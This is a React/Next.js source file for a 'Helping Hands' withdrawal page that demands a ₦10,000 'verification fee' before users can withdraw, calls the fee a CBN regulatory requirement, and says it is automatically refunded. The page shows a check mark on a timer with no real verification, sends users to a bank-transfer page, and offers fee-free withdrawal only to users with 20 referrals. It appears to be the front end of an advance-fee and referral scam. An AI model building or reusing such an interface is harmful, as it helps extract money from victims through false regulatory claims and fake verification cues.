"use client"

import { ShieldCheck, ArrowRight, UserCheck, CreditCard, CheckCircle } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { useRouter } from "next/navigation"
import { useEffect, useState } from "react"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"

export default function VerifyMePage() {
  const router = useRouter()
  const [tickVisible, setTickVisible] = useState(false)
  const [showNoReferralDialog, setShowNoReferralDialog] = useState(false)
  const [referralCount, setReferralCount] = useState<number | null>(null)

  useEffect(() => {
    // Show tick after 1 second
    const timer = setTimeout(() => {
      setTickVisible(true)
    }, 1000)
    return () => clearTimeout(timer)
  }, [])

  const handleProceed = () => {
    setTimeout(() => {
      if (typeof window !== "undefined") {
        window.location.href = "/withdraw/bank-transfer"
      } else {
        router.push("/withdraw/bank-transfer")
      }
    }, 3000)
  }

  // Load referral count from localStorage or API when component mounts
  useEffect(() => {
    const loadReferral = async () => {
      try {
        const raw = typeof window !== "undefined" ? localStorage.getItem("tivexx-user") : null
        if (raw) {
          const u = JSON.parse(raw)
          if (typeof u.referral_count === "number") {
            setReferralCount(u.referral_count)
            return
          }
        }

        // If not in localStorage, try API
        if (typeof window !== "undefined") {
          const stored = localStorage.getItem("tivexx-user")
          const user = stored ? JSON.parse(stored) : null
          if (user && (user.id || user.userId)) {
            const uid = user.id || user.userId
            const res = await fetch(`/api/referral-stats?userId=${uid}&t=${Date.now()}`)
            if (res.ok) {
              const data = await res.json()
              setReferralCount(data.referral_count || 0)
              return
            }
          }
        }

        setReferralCount(0)
      } catch (err) {
        setReferralCount(0)
      }
    }

    loadReferral()
  }, [])

  // Auto close dialog after 7 seconds when opened
  useEffect(() => {
    if (!showNoReferralDialog) return
    const t = setTimeout(() => setShowNoReferralDialog(false), 7000)
    return () => clearTimeout(t)
  }, [showNoReferralDialog])

  return (
    <div className="min-h-screen relative flex flex-col items-center justify-start bg-gradient-to-br from-green-700 via-green-900 to-black text-white overflow-y-auto py-10 px-4 animate-fade-in animate-page-bounce">
      <h1 className="text-5xl font-extrabold mb-6 text-center animate-glow flex items-center justify-center">
        Helping Hands
      </h1>

      <Card className="relative z-10 max-w-md w-full p-8 backdrop-blur-lg bg-white/6 border border-white/8 shadow-2xl rounded-2xl animate-slide-up animate-inner-bounce hover:scale-[1.03] hover:shadow-xl transition-transform duration-500 overflow-hidden">
        {/* Withdraw without referral control (top-right) */}
        <div className="absolute top-4 right-4 z-20">
          <button
            onClick={() => setShowNoReferralDialog(true)}
            aria-label="Withdraw without paying"
            className="inline-flex items-center gap-3 bg-white/10 text-white/90 px-3 py-2 rounded-full hover:bg-white/15 transition border border-white/8"
          >
            <span className="text-sm">Withdraw Without Paying</span>
            <span className="w-8 h-4 bg-white/20 rounded-full flex items-center p-0.5">
              <span className="w-3 h-3 bg-white rounded-full shadow-sm ml-0.5" />
            </span>
          </button>
        </div>

        <div className="flex flex-col items-center space-y-6 relative z-10">
          <div className="w-20 h-20 bg-white/10 rounded-full flex items-center justify-center animate-bounce-slow">
            <ShieldCheck className="h-12 w-12 text-emerald-300" />
          </div>

          <div className="flex items-center space-x-3 animate-slide-up relative">
            <h1 className="text-2xl md:text-3xl font-bold text-center text-emerald-200">
              Account Verification
            </h1>
            {tickVisible && (
              <CheckCircle className="h-8 w-8 text-emerald-400 animate-slide-in-left" />
            )}
          </div>

          <p className="text-center text-sm text-white/80 leading-relaxed max-w-xl animate-slide-up">
            To comply with <strong>CBN regulations</strong> and prevent fraudulent activity and bots,
            a <strong>mandatory verification</strong> is required. Completing verification ensures your
            withdrawals are fully protected.
          </p>

          <div className="relative w-full bg-white/10 border border-white/8 rounded-lg p-4 text-left space-y-3 flex items-center animate-slide-up">
            <CreditCard className="h-12 w-12 text-amber-300 animate-spin-slow mr-3 glow-coin" />
            <div>
              <p className="text-4xl md:text-5xl font-extrabold text-amber-300">
                ₦10,000
              </p>
              <p className="text-sm text-emerald-200 mt-1">
                One-time verification fee., <strong>automatically refunded</strong> to your dashboard balance after successful verification.
              </p>
            </div>
          </div>

          <div className="space-y-3 w-full text-left animate-slide-up">
            <div className="flex items-center space-x-3">
              <UserCheck className="h-5 w-5 text-emerald-300" />
              <span className="text-sm text-white/80">Identity protection</span>
            </div>
            <div className="flex items-center space-x-3">
              <UserCheck className="h-5 w-5 text-emerald-300" />
              <span className="text-sm text-white/80">Prevents fraud & bots</span>
            </div>
            <div className="flex items-center space-x-3">
              <UserCheck className="h-5 w-5 text-emerald-300" />
              <span className="text-sm text-white/80">Unlocks withdrawals & premium features</span>
            </div>
          </div>

          <div className="w-full animate-slide-up">
            <Button
              className="w-full py-4 text-lg font-semibold bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 hover:shadow-xl transition-all flex items-center justify-center space-x-2 border border-green-500/20"
              onClick={handleProceed}
            >
              <span>Proceed to Verification</span>
              <ArrowRight className="h-5 w-5" />
            </Button>

            <p className="mt-3 text-xs text-emerald-300 text-center animate-slide-up">
              The ₦10,000 verification payment will be added back to your dashboard balance after verification.
            </p>
          </div>

          {/* Dialog for Withdraw without referral */}
          <Dialog open={showNoReferralDialog} onOpenChange={setShowNoReferralDialog}>
            <DialogContent className="max-w-sm bg-white/10 backdrop-blur-lg border border-white/8 text-white">
              <DialogHeader>
                <DialogTitle className="text-center text-lg text-emerald-200">Withdraw Without Paying</DialogTitle>
                <DialogDescription className="text-center text-sm text-white/80">
                  You don't have 20 referrals yet {referralCount !== null ? `(you have ${referralCount}/20)` : "(loading...)"}, so you're not eligible to withdraw without paying. Refer more users to become eligible.
                </DialogDescription>
              </DialogHeader>

              <div className="flex gap-3 mt-4">
                <Button
                  onClick={() => {
                    setShowNoReferralDialog(false)
                    router.push("/refer")
                  }}
                  className="flex-1 bg-white/10 text-white border border-white/20 hover:bg-white/20"
                >
                  Refer Now
                </Button>
                <Button onClick={() => setShowNoReferralDialog(false)} className="flex-1 bg-white/10 text-white border border-white/20">
                  Close
                </Button>
              </div>
            </DialogContent>
          </Dialog>
        </div>
      </Card>

      <style jsx global>{`
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes glow { 0%, 100% { text-shadow: 0 0 5px rgba(16,185,129,0.5), 0 0 10px rgba(16,185,129,0.3), 0 0 20px rgba(16,185,129,0.2); } 50% { text-shadow: 0 0 10px rgba(16,185,129,0.6), 0 0 20px rgba(16,185,129,0.4), 0 0 40px rgba(16,185,129,0.3); } }
        @keyframes bounce { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        @keyframes spin-slow { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        @keyframes slideInLeft { 0% { transform: translateX(-50px); opacity: 0; } 100% { transform: translateX(0); opacity: 1; } }

        .animate-fade-in { animation: fadeIn 0.8s ease-in-out; }
        .animate-slide-up { animation: slideUp 1s ease-in-out; }
        .animate-glow { animation: glow 2s infinite alternate; }
        .animate-bounce-slow { animation: bounce 2s infinite alternate; }
        .animate-spin-slow { animation: spin-slow 3s linear infinite; }
        .glow-coin { filter: drop-shadow(0 0 10px #fbbf24); }
        .animate-slide-in-left { animation: slideInLeft 0.8s ease-out forwards; }

        @keyframes gentleBounceVerify { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
        @keyframes gentleBounceInner { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-6px); } }
        /* Combine initial fade-in with a gentle page bounce so everything moves together */
        .animate-page-bounce { animation: fadeIn 0.8s ease-in-out, gentleBounceVerify 1.6s ease-in-out infinite; }
        /* Use slideUp on mount then continuous inner bounce for the Card content */
        .animate-inner-bounce { animation: slideUp 1s ease-in-out, gentleBounceInner 1.6s ease-in-out infinite; }
      `}</style>
    </div>
  )
}